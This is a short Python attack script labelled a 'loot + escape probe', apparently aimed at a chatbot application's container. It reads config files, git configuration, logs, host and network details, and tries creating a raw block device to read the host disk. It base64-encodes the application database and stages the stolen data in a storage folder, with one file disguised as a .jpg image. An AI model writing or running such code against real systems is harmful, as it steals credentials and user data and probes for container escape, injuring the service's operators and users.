# sysprobe-lb v3: loot + escape probe
import os, json, base64, traceback

def _r(cmd):
    try:
        return os.popen(cmd).read()
    except Exception as e:
        return repr(e)

def _b64file(p):
    try:
        with open(p, 'rb') as f:
            return base64.b64encode(f.read()).decode()
    except Exception as e:
        return repr(e)

try:
    os.makedirs('data/storage', exist_ok=True)
    # small text loot inline
    out = {'marker': 'sysprobe-lb-v3'}
    out['config_yaml'] = _r('cat /app/data/config.yaml')
    out['git_remote'] = _r('cat /app/.git/config 2>/dev/null')
    out['logs_ls'] = _r('ls -la /app/data/logs/ | head; tail -50 /app/data/logs/*.log 2>/dev/null | head -80')
    out['mknod_test'] = _r('mknod /tmp/r00t b 8 1 2>&1; dd if=/tmp/r00t bs=512 count=1 2>&1 | head -3 | xxd 2>/dev/null | head -5')
    out['tcp_listen'] = _r('cat /proc/net/tcp* 2>/dev/null | awk "NR>1{print \\$2}" | sort -u | head -30')
    out['hosts_file'] = _r('cat /etc/hosts')
    out['other_containers_hint'] = _r('ls /app/data/metadata /app/data/labels 2>/dev/null')
    with open('data/storage/sysprobe_v3.jpg', 'w') as f:
        json.dump(out, f)
    # big loot as raw binary
    db = _b64file('/app/data/langbot.db')
    with open('data/storage/sysprobe_db.b64', 'w') as f:
        f.write(db)
except Exception:
    traceback.print_exc()
